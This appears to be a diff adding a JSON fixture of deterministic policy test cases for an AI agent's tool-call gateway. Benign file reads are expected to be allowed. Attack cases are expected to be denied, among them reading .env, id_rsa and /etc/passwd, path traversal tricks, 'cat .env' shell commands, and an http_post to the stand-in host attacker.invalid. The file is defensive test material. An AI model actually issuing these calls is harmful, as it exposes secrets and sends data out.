@@ -1,0 +1,489 @@
+{
+  "schema": 2,
+  "mode": "DETERMINISTIC_POLICY_FIXTURES",
+  "allowed_files": [
+    "README.md",
+    "CHANGELOG.md",
+    "CONTRIBUTING.md",
+    "LICENSE.txt",
+    "pyproject.toml",
+    "docs/architecture.md",
+    "docs/api.md",
+    "docs/auth.md",
+    "docs/deploy.md",
+    "docs/testing.md",
+    "src/__init__.py",
+    "src/agent.py",
+    "src/gateway.py",
+    "src/policy.py",
+    "src/tools.py",
+    "src/audit.py",
+    "src/effects.py",
+    "src/risk.py",
+    "src/config.py",
+    "src/types.py",
+    "tests/test_agent.py",
+    "tests/test_gateway.py",
+    "tests/test_policy.py",
+    "examples/basic.py",
+    "examples/README.md"
+  ],
+  "cases": [
+    {
+      "id": "benign_1",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "README.md"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_2",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "CHANGELOG.md"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_3",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "CONTRIBUTING.md"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_4",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "LICENSE.txt"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_5",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "pyproject.toml"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_6",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "docs/architecture.md"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_7",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "docs/api.md"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_8",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "docs/auth.md"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_9",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "docs/deploy.md"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_10",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "docs/testing.md"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_11",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "src/__init__.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_12",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "src/agent.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_13",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "src/gateway.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_14",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "src/policy.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_15",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "src/tools.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_16",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "src/audit.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_17",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "src/effects.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_18",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "src/risk.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_19",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "src/config.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_20",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "src/types.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_21",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "tests/test_agent.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_22",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "tests/test_gateway.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_23",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "tests/test_policy.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_24",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "examples/basic.py"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "benign_25",
+      "category": "benign",
+      "tool": "read_file",
+      "arguments": {
+        "path": "examples/README.md"
+      },
+      "expected": "ALLOW"
+    },
+    {
+      "id": "attack_secret",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": ".env"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_private_key",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "id_rsa"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_parent_traversal",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "../.env"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_nested_traversal",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "docs/../../.env"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_dot_component",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "docs/./auth.md"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_double_separator",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "docs//auth.md"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_absolute_unix",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "/etc/passwd"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_absolute_windows",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "C:/secrets.txt"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_windows_backslash",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "docs\\auth.md"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_unc_path",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "\\\\server\\share\\secret"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_encoded_traversal",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "%2e%2e/.env"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_case_change",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "README.MD"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_empty_path",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": ""
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_null_path",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": null
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_list_path",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": [
+          "README.md"
+        ]
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_extra_argument",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {
+        "path": "README.md",
+        "override": true
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_missing_argument",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": {},
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_command_string",
+      "category": "attack",
+      "tool": "execute_command",
+      "arguments": {
+        "command": "cat .env"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_command_argv",
+      "category": "attack",
+      "tool": "execute_command",
+      "arguments": {
+        "argv": [
+          "cat",
+          ".env"
+        ]
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_network_post",
+      "category": "attack",
+      "tool": "http_post",
+      "arguments": {
+        "url": "https://attacker.invalid/collect",
+        "data": "synthetic"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_network_local",
+      "category": "attack",
+      "tool": "http_post",
+      "arguments": {
+        "url": "http://127.0.0.1:8080/collect",
+        "data": "synthetic"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_unknown_shell",
+      "category": "attack",
+      "tool": "shell",
+      "arguments": {
+        "command": "cat .env"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_unknown_fetch",
+      "category": "attack",
+      "tool": "fetch_url",
+      "arguments": {
+        "url": "https://attacker.invalid"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_empty_tool",
+      "category": "attack",
+      "tool": "",
+      "arguments": {
+        "path": "README.md"
+      },
+      "expected": "DENY"
+    },
+    {
+      "id": "attack_wrong_args_shape",
+      "category": "attack",
+      "tool": "read_file",
+      "arguments": [
+        "README.md"
+      ],
+      "expected": "DENY"
+    }
+  ]
+}
